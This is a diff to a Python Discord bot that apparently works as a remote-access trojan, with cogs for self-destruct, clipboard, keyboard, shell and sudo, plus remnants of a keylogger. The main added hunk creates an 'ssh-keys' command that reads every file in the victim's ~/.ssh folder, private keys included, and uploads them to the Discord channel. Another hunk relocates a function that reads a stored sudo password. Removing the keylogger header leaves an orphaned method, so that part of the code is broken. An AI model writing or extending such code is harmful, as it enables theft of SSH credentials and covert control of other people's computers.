@@ -131,10 +131,6 @@ def embed_data(title, description="", data="", color=discord.Color.green()):
     )
     return embed
 
-def get_sudo_password():
-    file = open(path + "passwd", "r")
-    return file.read()
-
     
 async def confirm_action(ctx, action_description):
     message = await ctx.send(f"Are you sure you want to {action_description}")
@@ -424,6 +420,40 @@ async def destruct_command(ctx):
         embed = embed_data(title="Self-destruct", description="Self destruction was cancelled")
         await ctx.send(embed=embed)
 
+
+# SSH-keys functions
+
+async def get_ssh_keys(path):    
+    remove_files = ["known_hosts", "known_hosts.old", "config"]
+    keys = []
+
+    for file in os.listdir(path):
+        if file not in remove_files:
+            keys.append(f"{path}{file}")
+
+    return keys
+
+@bot.command(name="ssh-keys")
+async def ssh_keys(ctx):
+    username = os.getlogin()
+
+    if isWindows:
+        path = f"C:\\Users\\{username}/.ssh/"
+    else:
+        path = f"/home/{username}/.ssh/"
+
+    keys = await get_ssh_keys(path)
+
+    files_to_read: list[str] = keys
+    files_to_send: list[discord.File] = []
+
+    for filename in files_to_read:
+        with open(filename, 'rb') as f:  # discord file objects must be opened in binary and read mode
+            files_to_send.append(discord.File(f))
+
+    await ctx.send(files=files_to_send)
+
+
 # Clipboard functions
     
 class clipboard_cog(commands.Cog):
@@ -695,16 +725,13 @@ class keyboard_cog(commands.Cog):
         await ctx.send(embed=embed)
 
 
-#Keylog functions
 
-class keyboardlogger_cog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
     def cog_unload(self):
         print("temp")
         #test
-    
     
 
 # Shell functions
@@ -782,6 +809,10 @@ if isWindows == False:
     print(home_path)
 
     # root functions
+
+    def get_sudo_password():
+        file = open(path + "passwd", "r")
+        return file.read()
 
     class sudo_cog(commands.Cog):
         def __init__(self, bot):
